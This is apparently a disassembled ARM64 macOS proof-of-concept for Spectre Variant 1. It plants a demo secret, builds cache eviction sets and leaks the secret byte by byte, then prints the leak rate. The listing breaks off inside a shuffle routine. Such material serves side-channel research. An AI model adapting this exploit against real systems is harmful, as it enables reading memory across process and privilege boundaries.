spectre:
(__TEXT,__text) section
_main:
0000000100002844	sub	sp, sp, #0x80
0000000100002848	stp	x24, x23, [sp, #0x40]
000000010000284c	stp	x22, x21, [sp, #0x50]
0000000100002850	stp	x20, x19, [sp, #0x60]
0000000100002854	stp	x29, x30, [sp, #0x70]
0000000100002858	add	x29, sp, #0x70
000000010000285c	bl	_timer_start
0000000100002860	mov	w8, #0x1
0000000100002864	str	x8, [sp]
0000000100002868	adr	x0, #0x14f8 ; literal pool for: "[Spectre Variant %d]\n"
000000010000286c	nop
0000000100002870	bl	0x100003ccc ; symbol stub for: _printf
0000000100002874	mov	w0, #0x19
0000000100002878	bl	0x100003ca8 ; symbol stub for: _malloc
000000010000287c	mov	x19, x0
0000000100002880	adr	x0, #0x1514 ; literal pool for: " ---- SETUP ---- "
0000000100002884	nop
0000000100002888	bl	0x100003cfc ; symbol stub for: _puts
000000010000288c	nop
0000000100002890	ldr	x20, #0x1778 ; literal pool symbol address: ___stdoutp
0000000100002894	ldr	x0, [x20]
0000000100002898	bl	0x100003c6c ; symbol stub for: _fflush
000000010000289c	adr	x0, #0x14da ; literal pool for: "ABC"
00000001000028a0	nop
00000001000028a4	adr	x1, #0x14d6 ; literal pool for: "S3cret P4ssword, really!!"
00000001000028a8	nop
00000001000028ac	bl	_setup
00000001000028b0	mov	w0, #0xa
00000001000028b4	bl	0x100003cf0 ; symbol stub for: _putchar
00000001000028b8	adr	x0, #0x14ee ; literal pool for: " ---- LEAKING ----"
00000001000028bc	nop
00000001000028c0	bl	0x100003cfc ; symbol stub for: _puts
00000001000028c4	ldr	x0, [x20]
00000001000028c8	bl	0x100003c6c ; symbol stub for: _fflush
00000001000028cc	add	x0, sp, #0x30
00000001000028d0	mov	x1, #0x0
00000001000028d4	bl	0x100003c90 ; symbol stub for: _gettimeofday
00000001000028d8	mov	x20, #0x0
00000001000028dc	cmp	x20, #0x19
00000001000028e0	b.eq	0x1000028fc
00000001000028e4	add	x0, x20, #0x4
00000001000028e8	bl	_leakByte
00000001000028ec	strb	w0, [x19, x20]
00000001000028f0	add	x20, x20, #0x1
00000001000028f4	cmp	x20, #0x19
00000001000028f8	b.ne	0x1000028e4
00000001000028fc	add	x0, sp, #0x20
0000000100002900	mov	x1, #0x0
0000000100002904	bl	0x100003c90 ; symbol stub for: _gettimeofday
0000000100002908	ldr	w20, [sp, #0x20]
000000010000290c	ldr	w22, [sp, #0x28]
0000000100002910	ldr	w21, [sp, #0x30]
0000000100002914	ldr	w23, [sp, #0x38]
0000000100002918	mov	w0, #0xa
000000010000291c	bl	0x100003cf0 ; symbol stub for: _putchar
0000000100002920	adr	x0, #0x1499 ; literal pool for: " ---- RESULT ----"
0000000100002924	nop
0000000100002928	bl	0x100003cfc ; symbol stub for: _puts
000000010000292c	ldrsb	w0, [x19]
0000000100002930	bl	0x100003cf0 ; symbol stub for: _putchar
0000000100002934	ldrsb	w0, [x19, #0x1]
0000000100002938	bl	0x100003cf0 ; symbol stub for: _putchar
000000010000293c	ldrsb	w0, [x19, #0x2]
0000000100002940	bl	0x100003cf0 ; symbol stub for: _putchar
0000000100002944	ldrsb	w0, [x19, #0x3]
0000000100002948	bl	0x100003cf0 ; symbol stub for: _putchar
000000010000294c	ldrsb	w0, [x19, #0x4]
0000000100002950	bl	0x100003cf0 ; symbol stub for: _putchar
0000000100002954	ldrsb	w0, [x19, #0x5]
0000000100002958	bl	0x100003cf0 ; symbol stub for: _putchar
000000010000295c	ldrsb	w0, [x19, #0x6]
0000000100002960	bl	0x100003cf0 ; symbol stub for: _putchar
0000000100002964	ldrsb	w0, [x19, #0x7]
0000000100002968	bl	0x100003cf0 ; symbol stub for: _putchar
000000010000296c	ldrsb	w0, [x19, #0x8]
0000000100002970	bl	0x100003cf0 ; symbol stub for: _putchar
0000000100002974	ldrsb	w0, [x19, #0x9]
0000000100002978	bl	0x100003cf0 ; symbol stub for: _putchar
000000010000297c	ldrsb	w0, [x19, #0xa]
0000000100002980	bl	0x100003cf0 ; symbol stub for: _putchar
0000000100002984	ldrsb	w0, [x19, #0xb]
0000000100002988	bl	0x100003cf0 ; symbol stub for: _putchar
000000010000298c	ldrsb	w0, [x19, #0xc]
0000000100002990	bl	0x100003cf0 ; symbol stub for: _putchar
0000000100002994	ldrsb	w0, [x19, #0xd]
0000000100002998	bl	0x100003cf0 ; symbol stub for: _putchar
000000010000299c	ldrsb	w0, [x19, #0xe]
00000001000029a0	bl	0x100003cf0 ; symbol stub for: _putchar
00000001000029a4	ldrsb	w0, [x19, #0xf]
00000001000029a8	bl	0x100003cf0 ; symbol stub for: _putchar
00000001000029ac	ldrsb	w0, [x19, #0x10]
00000001000029b0	bl	0x100003cf0 ; symbol stub for: _putchar
00000001000029b4	ldrsb	w0, [x19, #0x11]
00000001000029b8	bl	0x100003cf0 ; symbol stub for: _putchar
00000001000029bc	ldrsb	w0, [x19, #0x12]
00000001000029c0	bl	0x100003cf0 ; symbol stub for: _putchar
00000001000029c4	ldrsb	w0, [x19, #0x13]
00000001000029c8	bl	0x100003cf0 ; symbol stub for: _putchar
00000001000029cc	ldrsb	w0, [x19, #0x14]
00000001000029d0	bl	0x100003cf0 ; symbol stub for: _putchar
00000001000029d4	ldrsb	w0, [x19, #0x15]
00000001000029d8	bl	0x100003cf0 ; symbol stub for: _putchar
00000001000029dc	ldrsb	w0, [x19, #0x16]
00000001000029e0	bl	0x100003cf0 ; symbol stub for: _putchar
00000001000029e4	ldrsb	w0, [x19, #0x17]
00000001000029e8	bl	0x100003cf0 ; symbol stub for: _putchar
00000001000029ec	ldrsb	w0, [x19, #0x18]
00000001000029f0	bl	0x100003cf0 ; symbol stub for: _putchar
00000001000029f4	sub	w8, w22, w23
00000001000029f8	mov	w9, #0x4dd3
00000001000029fc	movk	w9, #0x1062, lsl #16
0000000100002a00	smull	x8, w8, w9
0000000100002a04	lsr	x9, x8, #63
0000000100002a08	asr	x8, x8, #38
0000000100002a0c	add	w8, w8, w9
0000000100002a10	sub	w9, w20, w21
0000000100002a14	mov	w10, #0x3e8
0000000100002a18	madd	w19, w9, w10, w8
0000000100002a1c	mov	w0, #0xa
0000000100002a20	bl	0x100003cf0 ; symbol stub for: _putchar
0000000100002a24	scvtf	d0, w19
0000000100002a28	fmov	d1, #25.00000000
0000000100002a2c	fdiv	d0, d1, d0
0000000100002a30	mov	x8, #0x400000000000
0000000100002a34	movk	x8, #0x408f, lsl #48
0000000100002a38	fmov	d1, x8
0000000100002a3c	fmul	d0, d0, d1
0000000100002a40	str	d0, [sp, #0x10]
0000000100002a44	mov	w8, #0x19
0000000100002a48	stp	x8, x19, [sp]
0000000100002a4c	adr	x0, #0x137f ; literal pool for: "leaked %d bytes in %dms. (%.2f bytes / sec)"
0000000100002a50	nop
0000000100002a54	bl	0x100003ccc ; symbol stub for: _printf
0000000100002a58	mov	w0, #0xa
0000000100002a5c	bl	0x100003cf0 ; symbol stub for: _putchar
0000000100002a60	bl	_timer_stop
0000000100002a64	mov	w0, #0x0
0000000100002a68	ldp	x29, x30, [sp, #0x70]
0000000100002a6c	ldp	x20, x19, [sp, #0x60]
0000000100002a70	ldp	x22, x21, [sp, #0x50]
0000000100002a74	ldp	x24, x23, [sp, #0x40]
0000000100002a78	add	sp, sp, #0x80
0000000100002a7c	ret
_evset_init:
0000000100002a80	stp	x20, x19, [sp, #-0x20]!
0000000100002a84	stp	x29, x30, [sp, #0x10]
0000000100002a88	add	x29, sp, #0x10
0000000100002a8c	mov	x0, #0x0
0000000100002a90	bl	0x100003d44 ; symbol stub for: _time
0000000100002a94	bl	0x100003d20 ; symbol stub for: _srand
0000000100002a98	bl	_timer_start
0000000100002a9c	adrp	x8, 6 ; 0x100008000
0000000100002aa0	ldr	x9, [x8, #0x30]
0000000100002aa4	cbnz	x9, 0x100002ab4
0000000100002aa8	adr	x9, #0xbd0
0000000100002aac	nop
0000000100002ab0	str	x9, [x8, #0x30]
0000000100002ab4	adrp	x8, 6 ; 0x100008000
0000000100002ab8	ldrb	w9, [x8, #0x18]
0000000100002abc	tbnz	w9, #0x0, 0x100002ac8
0000000100002ac0	mov	w9, #0x1
0000000100002ac4	strb	w9, [x8, #0x18]
0000000100002ac8	adrp	x8, 6 ; 0x100008000
0000000100002acc	ldrb	w9, [x8, #0x20]
0000000100002ad0	tbnz	w9, #0x0, 0x100002adc
0000000100002ad4	mov	w9, #0x1
0000000100002ad8	strb	w9, [x8, #0x20]
0000000100002adc	adrp	x8, 6 ; 0x100008000
0000000100002ae0	ldrb	w9, [x8, #0x28]
0000000100002ae4	tbnz	w9, #0x0, 0x100002af0
0000000100002ae8	mov	w9, #0x1
0000000100002aec	strb	w9, [x8, #0x28]
0000000100002af0	adrp	x8, 6 ; 0x100008000
0000000100002af4	ldrb	w9, [x8]
0000000100002af8	tbnz	w9, #0x0, 0x100002b04
0000000100002afc	mov	w9, #0x1
0000000100002b00	strb	w9, [x8]
0000000100002b04	adrp	x19, 6 ; 0x100008000
0000000100002b08	ldr	x8, [x19, #0x8]
0000000100002b0c	cbnz	x8, 0x100002b20
0000000100002b10	mov	w0, #0x1
0000000100002b14	mov	w1, #0x8
0000000100002b18	bl	0x100003c60 ; symbol stub for: _calloc
0000000100002b1c	str	x0, [x19, #0x8]
0000000100002b20	adrp	x19, 6 ; 0x100008000
0000000100002b24	ldr	x8, [x19, #0x10]
0000000100002b28	cbnz	x8, 0x100002b3c
0000000100002b2c	mov	w0, #0x1
0000000100002b30	mov	w1, #0x8
0000000100002b34	bl	0x100003c60 ; symbol stub for: _calloc
0000000100002b38	str	x0, [x19, #0x10]
0000000100002b3c	ldp	x29, x30, [sp, #0x10]
0000000100002b40	ldp	x20, x19, [sp], #0x20
0000000100002b44	b	_timer_stop
_evset_find:
0000000100002b48	sub	sp, sp, #0x70
0000000100002b4c	stp	x28, x27, [sp, #0x10]
0000000100002b50	stp	x26, x25, [sp, #0x20]
0000000100002b54	stp	x24, x23, [sp, #0x30]
0000000100002b58	stp	x22, x21, [sp, #0x40]
0000000100002b5c	stp	x20, x19, [sp, #0x50]
0000000100002b60	stp	x29, x30, [sp, #0x60]
0000000100002b64	add	x29, sp, #0x60
0000000100002b68	mov	x20, x0
0000000100002b6c	mov	x8, #0x0
0000000100002b70	and	x19, x0, #0x3fc0
0000000100002b74	lsr	x24, x0, #14
0000000100002b78	adrp	x26, 6 ; 0x100008000
0000000100002b7c	ldr	w10, [x26, #0x1c]
0000000100002b80	adrp	x25, 6 ; 0x100008000
0000000100002b84	ldr	x9, [x25, #0x10]
0000000100002b88	cmp	w10, #0x1
0000000100002b8c	csinc	w10, w10, wzr, gt
0000000100002b90	sub	w10, w10, #0x1
0000000100002b94	cmp	x10, x8
0000000100002b98	b.eq	0x100002bb4
0000000100002b9c	ldr	x11, [x9, x8, lsl #3]
0000000100002ba0	cmp	x11, x24
0000000100002ba4	b.eq	0x100002cb8
0000000100002ba8	add	x8, x8, #0x1
0000000100002bac	cmp	x10, x8
0000000100002bb0	b.ne	0x100002b9c
0000000100002bb4	adrp	x27, 6 ; 0x100008000
0000000100002bb8	ldrb	w8, [x27, #0x28]
0000000100002bbc	cmp	w8, #0x0
0000000100002bc0	mov	w8, #0x1400000
0000000100002bc4	csel	x1, x8, xzr, ne
0000000100002bc8	mov	x0, #0x0
0000000100002bcc	mov	w2, #0x3
0000000100002bd0	mov	w3, #0x1002
0000000100002bd4	mov	w4, #0x0
0000000100002bd8	mov	x5, #0x0
0000000100002bdc	bl	0x100003cb4 ; symbol stub for: _mmap
0000000100002be0	mov	x21, x0
0000000100002be4	cbnz	x0, 0x100002bf4
0000000100002be8	adr	x0, #0x12ca ; literal pool for: "MMAP FAILED"
0000000100002bec	nop
0000000100002bf0	bl	0x100003cfc ; symbol stub for: _puts
0000000100002bf4	add	x8, x21, x19
0000000100002bf8	str	x8, [sp, #0x8]
0000000100002bfc	ldrb	w8, [x27, #0x28]
0000000100002c00	cmp	w8, #0x0
0000000100002c04	mov	w28, #0x1400000
0000000100002c08	csel	x1, x28, xzr, ne
0000000100002c0c	mov	x0, x21
0000000100002c10	mov	x2, x19
0000000100002c14	bl	_initialize_list
0000000100002c18	mov	w25, #0x0
0000000100002c1c	str	xzr, [sp]
0000000100002c20	adr	x23, #0x12c1 ; literal pool for: "finding eviction set failed!"
0000000100002c24	nop
0000000100002c28	adr	x22, #0x12d6 ; literal pool for: "max retries exceeded!"
0000000100002c2c	nop
0000000100002c30	add	x0, sp, #0x8
0000000100002c34	mov	x1, sp
0000000100002c38	mov	x2, x20
0000000100002c3c	bl	_gt_eviction
0000000100002c40	cbz	w0, 0x100002cd4
0000000100002c44	mov	x0, x23
0000000100002c48	bl	0x100003cfc ; symbol stub for: _puts
0000000100002c4c	cmp	w25, #0x15
0000000100002c50	b.eq	0x100002cec
0000000100002c54	ldrb	w8, [x27, #0x28]
0000000100002c58	cmp	w8, #0x0
0000000100002c5c	csel	x1, x28, xzr, ne
0000000100002c60	mov	x0, x21
0000000100002c64	bl	0x100003cc0 ; symbol stub for: _munmap
0000000100002c68	ldrb	w8, [x27, #0x28]
0000000100002c6c	cmp	w8, #0x0
0000000100002c70	csel	x1, x28, xzr, ne
0000000100002c74	mov	x0, #0x0
0000000100002c78	mov	w2, #0x3
0000000100002c7c	mov	w3, #0x1002
0000000100002c80	mov	w4, #0x0
0000000100002c84	mov	x5, #0x0
0000000100002c88	bl	0x100003cb4 ; symbol stub for: _mmap
0000000100002c8c	mov	x21, x0
0000000100002c90	add	x8, x0, x19
0000000100002c94	str	x8, [sp, #0x8]
0000000100002c98	ldrb	w8, [x27, #0x28]
0000000100002c9c	cmp	w8, #0x0
0000000100002ca0	csel	x1, x28, xzr, ne
0000000100002ca4	mov	x2, x19
0000000100002ca8	bl	_initialize_list
0000000100002cac	str	xzr, [sp]
0000000100002cb0	add	w25, w25, #0x1
0000000100002cb4	b	0x100002c30
0000000100002cb8	nop
0000000100002cbc	ldr	x9, #0x534c
0000000100002cc0	sbfiz	x8, x8, #3, #32
0000000100002cc4	ldr	x0, [x9, x8]
0000000100002cc8	mov	x1, x19
0000000100002ccc	bl	_initialize_list_with_offset
0000000100002cd0	b	0x100002d50
0000000100002cd4	cmp	w25, #0x13
0000000100002cd8	adrp	x25, 6 ; 0x100008000
0000000100002cdc	b.hi	0x100002cf8
0000000100002ce0	adr	x22, #0x11ed ; literal pool for: "Eviction set found!"
0000000100002ce4	nop
0000000100002ce8	b	0x100002cf0
0000000100002cec	adrp	x25, 6 ; 0x100008000
0000000100002cf0	mov	x0, x22
0000000100002cf4	bl	0x100003cfc ; symbol stub for: _puts
0000000100002cf8	ldr	x8, [sp]
0000000100002cfc	adrp	x20, 6 ; 0x100008000
0000000100002d00	mov	x21, #-0x4000
0000000100002d04	mov	w22, #0x4000
0000000100002d08	adr	x19, #0x11b6 ; literal pool for: "munmap failed!"
0000000100002d0c	nop
0000000100002d10	b	0x100002d1c
0000000100002d14	str	x23, [sp]
0000000100002d18	mov	x8, x23
0000000100002d1c	cbz	x8, 0x100002d4c
0000000100002d20	ldr	x23, [x8]
0000000100002d24	ldrb	w9, [x20, #0x20]
0000000100002d28	cmp	w9, #0x0
0000000100002d2c	csel	x9, x21, xzr, ne
0000000100002d30	csel	x1, x22, xzr, ne
0000000100002d34	and	x0, x9, x8
0000000100002d38	bl	0x100003cc0 ; symbol stub for: _munmap
0000000100002d3c	cbz	w0, 0x100002d14
0000000100002d40	mov	x0, x19
0000000100002d44	bl	0x100003cfc ; symbol stub for: _puts
0000000100002d48	b	0x100002d14
0000000100002d4c	ldr	x0, [sp, #0x8]
0000000100002d50	nop
0000000100002d54	ldr	x8, #0x52b4
0000000100002d58	ldrsw	x9, [x26, #0x1c]
0000000100002d5c	lsl	x9, x9, #3
0000000100002d60	sub	x9, x9, #0x8
0000000100002d64	str	x0, [x8, x9]
0000000100002d68	ldr	x8, [x25, #0x10]
0000000100002d6c	str	x24, [x8, x9]
0000000100002d70	ldp	x29, x30, [sp, #0x60]
0000000100002d74	ldp	x20, x19, [sp, #0x50]
0000000100002d78	ldp	x22, x21, [sp, #0x40]
0000000100002d7c	ldp	x24, x23, [sp, #0x30]
0000000100002d80	ldp	x26, x25, [sp, #0x20]
0000000100002d84	ldp	x28, x27, [sp, #0x10]
0000000100002d88	add	sp, sp, #0x70
0000000100002d8c	ret
_initialize_list_with_offset:
0000000100002d90	mov	x8, #0x0
0000000100002d94	adrp	x9, 6 ; 0x100008000
0000000100002d98	ldrb	w9, [x9, #0x20]
0000000100002d9c	cmp	w9, #0x0
0000000100002da0	mov	w9, #0x3fff
0000000100002da4	csinv	x9, x9, xzr, ne
0000000100002da8	and	x9, x9, x0
0000000100002dac	eor	x9, x9, x1
0000000100002db0	mov	w10, #-0x2
0000000100002db4	mov	x11, x0
0000000100002db8	b	0x100002dc4
0000000100002dbc	ldr	x11, [x11]
0000000100002dc0	mov	x8, x12
0000000100002dc4	cbz	x11, 0x100002de4
0000000100002dc8	eor	x12, x9, x11
0000000100002dcc	str	w10, [x12, #0x10]
0000000100002dd0	str	xzr, [x12, #0x18]
0000000100002dd4	stp	xzr, x8, [x12]
0000000100002dd8	cbz	x8, 0x100002dbc
0000000100002ddc	str	x12, [x8]
0000000100002de0	b	0x100002dbc
0000000100002de4	eor	x0, x9, x0
0000000100002de8	ret
_initialize_list:
0000000100002dec	mov	x9, #0x0
0000000100002df0	sub	x8, x1, #0x40
0000000100002df4	adrp	x10, 6 ; 0x100008000
0000000100002df8	ldrb	w10, [x10, #0x20]
0000000100002dfc	cmp	w10, #0x0
0000000100002e00	mov	w10, #0x4000
0000000100002e04	csel	x10, x10, xzr, ne
0000000100002e08	mov	w11, #-0x2
0000000100002e0c	b	0x100002e18
0000000100002e10	add	x2, x2, x10
0000000100002e14	mov	x9, x12
0000000100002e18	cmp	x2, x8
0000000100002e1c	b.hs	0x100002e3c
0000000100002e20	add	x12, x0, x2
0000000100002e24	str	w11, [x12, #0x10]
0000000100002e28	str	xzr, [x12, #0x18]
0000000100002e2c	stp	xzr, x9, [x12]
0000000100002e30	cbz	x9, 0x100002e10
0000000100002e34	str	x12, [x9]
0000000100002e38	b	0x100002e10
0000000100002e3c	ret
_gt_eviction:
0000000100002e40	sub	sp, sp, #0xd0
0000000100002e44	stp	d11, d10, [sp, #0x50]
0000000100002e48	stp	d9, d8, [sp, #0x60]
0000000100002e4c	stp	x28, x27, [sp, #0x70]
0000000100002e50	stp	x26, x25, [sp, #0x80]
0000000100002e54	stp	x24, x23, [sp, #0x90]
0000000100002e58	stp	x22, x21, [sp, #0xa0]
0000000100002e5c	stp	x20, x19, [sp, #0xb0]
0000000100002e60	stp	x29, x30, [sp, #0xc0]
0000000100002e64	add	x29, sp, #0xc0
0000000100002e68	mov	x19, x2
0000000100002e6c	mov	x28, x1
0000000100002e70	mov	x21, x0
0000000100002e74	adrp	x27, 6 ; 0x100008000
0000000100002e78	ldrb	w23, [x27, #0x18]
0000000100002e7c	cmp	w23, #0x0
0000000100002e80	mov	w8, #0x21
0000000100002e84	csinc	x22, x8, xzr, ne
0000000100002e88	mov	x0, x22
0000000100002e8c	mov	w1, #0x8
0000000100002e90	bl	0x100003c60 ; symbol stub for: _calloc
0000000100002e94	cbz	x0, 0x10000317c
0000000100002e98	mov	x20, x0
0000000100002e9c	mov	x0, x22
0000000100002ea0	mov	w1, #0x4
0000000100002ea4	bl	0x100003c60 ; symbol stub for: _calloc
0000000100002ea8	cbz	x0, 0x10000318c
0000000100002eac	mov	x22, x0
0000000100002eb0	ldr	x26, [x21]
0000000100002eb4	mov	x0, x26
0000000100002eb8	bl	_list_length
0000000100002ebc	mov	w8, #0x20
0000000100002ec0	cmp	w23, #0x0
0000000100002ec4	csel	w8, w8, wzr, ne
0000000100002ec8	scvtf	d0, w8
0000000100002ecc	mov	x25, x0
0000000100002ed0	scvtf	d1, w0
0000000100002ed4	fdiv	d8, d0, d1
0000000100002ed8	orr	w8, w8, #0x1
0000000100002edc	scvtf	d1, w8
0000000100002ee0	fdiv	d9, d0, d1
0000000100002ee4	fmov	d0, d8
0000000100002ee8	bl	0x100003c9c ; symbol stub for: _log
0000000100002eec	fmov	d10, d0
0000000100002ef0	fmov	d0, d9
0000000100002ef4	bl	0x100003c9c ; symbol stub for: _log
0000000100002ef8	fdiv	d0, d10, d0
0000000100002efc	fcvtps	w24, d0
0000000100002f00	lsl	w8, w24, #1
0000000100002f04	str	x8, [sp, #0x28]
0000000100002f08	sxtw	x0, w8
0000000100002f0c	mov	w1, #0x8
0000000100002f10	bl	0x100003c60 ; symbol stub for: _calloc
0000000100002f14	str	x0, [sp, #0x48]
0000000100002f18	cbz	x0, 0x1000031a0
0000000100002f1c	str	x28, [sp, #0x20]
0000000100002f20	mov	w26, #0x0
0000000100002f24	str	wzr, [sp, #0x44]
0000000100002f28	nop
0000000100002f2c	ldr	q0, 0x100003d50
0000000100002f30	str	q0, [sp, #0x30]
0000000100002f34	tst	w23, #0x1
0000000100002f38	mov	w8, #0x20
0000000100002f3c	csel	w9, w8, wzr, ne
0000000100002f40	orr	w8, w9, #0x2
0000000100002f44	cmp	w8, #0x5
0000000100002f48	b.hs	0x100002f54
0000000100002f4c	mov	x8, #0x0
0000000100002f50	b	0x100002f78
0000000100002f54	sub	x8, x8, #0x2
0000000100002f58	mov	x10, x8
0000000100002f5c	mov	x11, x22
0000000100002f60	ldr	q0, [sp, #0x30]
0000000100002f64	movi.4s	v1, #0x4
0000000100002f68	str	q0, [x11], #0x10
0000000100002f6c	add.4s	v0, v0, v1
0000000100002f70	subs	x10, x10, #0x4
0000000100002f74	b.ne	0x100002f68
0000000100002f78	orr	w9, w9, #0x1
0000000100002f7c	cmp	x9, x8
0000000100002f80	b.eq	0x100002f94
0000000100002f84	str	w8, [x22, x8, lsl #2]
0000000100002f88	add	x8, x8, #0x1
0000000100002f8c	cmp	x9, x8
0000000100002f90	b.ne	0x100002f84
0000000100002f94	tst	w23, #0x1
0000000100002f98	mov	w8, #0x21
0000000100002f9c	csinc	x1, x8, xzr, ne
0000000100002fa0	mov	x0, x22
0000000100002fa4	bl	_shuffle
0000000100002fa8	ldrb	w8, [x27, #0x18]
0000000100002fac	sxtw	x28, w26
0000000100002fb0	tst	w8, #0x1
0000000100002fb4	mov	w9, #0x20
0000000100002fb8	csel	w9, w9, wzr, ne
0000000100002fbc	cmp	w25, w9
0000000100002fc0	b.le	0x100003104
0000000100002fc4	ldr	x0, [x21]
0000000100002fc8	tst	w8, #0x1
0000000100002fcc	mov	w23, #0x21
0000000100002fd0	csinc	w2, w23, wzr, ne
0000000100002fd4	mov	x1, x20
0000000100002fd8	bl	_list_split
0000000100002fdc	ldrb	w8, [x27, #0x18]
0000000100002fe0	ldr	w26, [x22]
0000000100002fe4	cmp	w8, #0x0
0000000100002fe8	csinc	w3, w23, wzr, ne
0000000100002fec	mov	x0, x21
0000000100002ff0	mov	x1, x20
0000000100002ff4	mov	x2, x26
0000000100002ff8	bl	_list_from_chunks
0000000100002ffc	ldr	x0, [x21]
0000000100003000	mov	x1, x19
0000000100003004	bl	_tests_avg
0000000100003008	cbz	w0, 0x10000304c
000000010000300c	mov	x24, #0x0
0000000100003010	ldrb	w23, [x27, #0x18]
0000000100003014	and	x8, x24, #0xffffffe0
0000000100003018	cmp	w23, #0x1
000000010000301c	ccmp	x8, #0x0, #0x0, eq
0000000100003020	b.ne	0x1000030a0
0000000100003024	ldr	x0, [x20, w26, sxtw #3]
0000000100003028	ldr	x8, [sp, #0x48]
000000010000302c	str	x0, [x8, x28, lsl #3]
0000000100003030	bl	_list_length
0000000100003034	ldr	x0, [x21]
0000000100003038	bl	_list_length
000000010000303c	mov	x25, x0
0000000100003040	add	x28, x28, #0x1
0000000100003044	mov	w8, #0x1
0000000100003048	b	0x100002fb0
000000010000304c	ldrb	w23, [x27, #0x18]
0000000100003050	cmp	w23, #0x1
0000000100003054	b.ne	0x1000030a0
0000000100003058	mov	w24, #0x1
000000010000305c	ldr	w26, [x22, x24, lsl #2]
0000000100003060	mov	x0, x21
0000000100003064	mov	x1, x20
0000000100003068	mov	x2, x26
000000010000306c	mov	w3, #0x21
0000000100003070	bl	_list_from_chunks
0000000100003074	ldr	x0, [x21]
0000000100003078	mov	x1, x19
000000010000307c	bl	_tests_avg
0000000100003080	cbnz	w0, 0x100003010
0000000100003084	ldrb	w23, [x27, #0x18]
0000000100003088	cmp	w23, #0x1
000000010000308c	b.ne	0x1000030a0
0000000100003090	add	x8, x24, #0x1
0000000100003094	cmp	x24, #0x20
0000000100003098	mov	x24, x8
000000010000309c	b.lo	0x10000305c
00000001000030a0	ldr	x1, [x20, w26, sxtw #3]
00000001000030a4	mov	x0, x21
00000001000030a8	bl	_list_concat
00000001000030ac	cmp	w28, #0x0
00000001000030b0	b.le	0x100003104
00000001000030b4	subs	w8, w28, #0x1
00000001000030b8	sbfiz	x26, x8, #3, #32
00000001000030bc	ldr	x25, [sp, #0x48]
00000001000030c0	ldr	x24, [x25, x26]
00000001000030c4	mov	x0, x24
00000001000030c8	bl	_list_length
00000001000030cc	mov	x0, x21
00000001000030d0	mov	x1, x24
00000001000030d4	bl	_list_concat
00000001000030d8	str	xzr, [x25, x26]
00000001000030dc	ldr	x0, [x21]
00000001000030e0	bl	_list_length
00000001000030e4	mov	x25, x0
00000001000030e8	subs	w26, w28, #0x1
00000001000030ec	b.eq	0x100003104
00000001000030f0	ldr	w8, [sp, #0x44]
00000001000030f4	add	w8, w8, #0x1
00000001000030f8	str	w8, [sp, #0x44]
00000001000030fc	cmp	w8, #0x33
0000000100003100	b.ne	0x100002f34
0000000100003104	mov	x23, #0x0
0000000100003108	ldp	x26, x8, [sp, #0x20]
000000010000310c	bic	w8, w8, w8, asr #31
0000000100003110	ubfiz	x24, x8, #3, #32
0000000100003114	ldr	x28, [sp, #0x48]
0000000100003118	cmp	x24, x23
000000010000311c	b.eq	0x100003138
0000000100003120	ldr	x1, [x28, x23]
0000000100003124	mov	x0, x26
0000000100003128	bl	_list_concat
000000010000312c	add	x23, x23, #0x8
0000000100003130	cmp	x24, x23
0000000100003134	b.ne	0x100003120
0000000100003138	mov	x0, x20
000000010000313c	bl	0x100003c84 ; symbol stub for: _free
0000000100003140	mov	x0, x22
0000000100003144	bl	0x100003c84 ; symbol stub for: _free
0000000100003148	mov	x0, x28
000000010000314c	bl	0x100003c84 ; symbol stub for: _free
0000000100003150	ldr	x0, [x21]
0000000100003154	mov	x1, x19
0000000100003158	bl	_tests_avg
000000010000315c	cbz	w0, 0x1000031d0
0000000100003160	ldrb	w8, [x27, #0x18]
0000000100003164	mov	w9, #0x20
0000000100003168	cmp	w8, #0x0
000000010000316c	csel	w8, w9, wzr, ne
0000000100003170	cmp	w25, w8
0000000100003174	cset	w0, gt
0000000100003178	b	0x1000031d4
000000010000317c	adr	x0, #0xd98 ; literal pool for: "Could not allocate chunks!"
0000000100003180	nop
0000000100003184	bl	0x100003cfc ; symbol stub for: _puts
0000000100003188	b	0x1000031d0
000000010000318c	adr	x0, #0xda3 ; literal pool for: "Could not allocate ichunks!"
0000000100003190	nop
0000000100003194	bl	0x100003cfc ; symbol stub for: _puts
0000000100003198	mov	x0, x20
000000010000319c	b	0x1000031cc
00000001000031a0	mov	x0, x26
00000001000031a4	bl	_list_length
00000001000031a8	str	x0, [sp, #0x18]
00000001000031ac	stp	d8, d9, [sp, #0x8]
00000001000031b0	str	x24, [sp]
00000001000031b4	adr	x0, #0xc43 ; literal pool for: "Could not allocate back (%d, %f, %f, %d)!\n"
00000001000031b8	nop
00000001000031bc	bl	0x100003ccc ; symbol stub for: _printf
00000001000031c0	mov	x0, x20
00000001000031c4	bl	0x100003c84 ; symbol stub for: _free
00000001000031c8	mov	x0, x22
00000001000031cc	bl	0x100003c84 ; symbol stub for: _free
00000001000031d0	mov	w0, #0x1
00000001000031d4	ldp	x29, x30, [sp, #0xc0]
00000001000031d8	ldp	x20, x19, [sp, #0xb0]
00000001000031dc	ldp	x22, x21, [sp, #0xa0]
00000001000031e0	ldp	x24, x23, [sp, #0x90]
00000001000031e4	ldp	x26, x25, [sp, #0x80]
00000001000031e8	ldp	x28, x27, [sp, #0x70]
00000001000031ec	ldp	d9, d8, [sp, #0x60]
00000001000031f0	ldp	d11, d10, [sp, #0x50]
00000001000031f4	add	sp, sp, #0xd0
00000001000031f8	ret
_list_length:
00000001000031fc	mov	w8, #0x0
0000000100003200	cbz	x0, 0x100003210
0000000100003204	add	w8, w8, #0x1
0000000100003208	ldr	x0, [x0]
000000010000320c	cbnz	x0, 0x100003204
0000000100003210	mov	x0, x8
0000000100003214	ret
_shuffle:
0000000100003218	cmp	x1, #0x2
000000010000321c	b.lo	0x10000329c
0000000100003220	stp	x24, x23, [sp, #-0x40]!
0000000100003224	stp	x22, x21, [sp, #0x10]
0000000100003228	stp	x20, x19, [sp, #0x20]
000000010000322c	stp	x29, x30, [sp, #0x30]
0000000100003230	add	x29, sp, #0x30
0000000100003234	mov	x20, x1
0000000100003238	mov	x19, x0
000000010000323c	mov	x21, #0x0
0000000100003240	mov	w22, #0x7fffffff
0000000100003244	subs	x23, x20, #0x1
0000000100003248	b.eq	0x10000328c
000000010000324c	bl	0x100003d08 ; symbol stub for: _rand
0000000100003250	sxtw	x8, w0
0000000100003254	udiv	x9, x22, x20
0000000100003258	add	x9, x9, #0x1
000000010000325c	udiv	x8, x8, x9
0000000100003260	add	x8, x21, x8
0000000100003264	lsl	x8, x8, #2
0000000100003268	ldr	w9, [x19, x8]
000000010000326c	lsl	x10, x21, #2
0000000100003270	ldr	w11, [x19, x10]
0000000100003274	str	w11, [x19, x8]
0000000100003278	str	w9, [x19, x10]
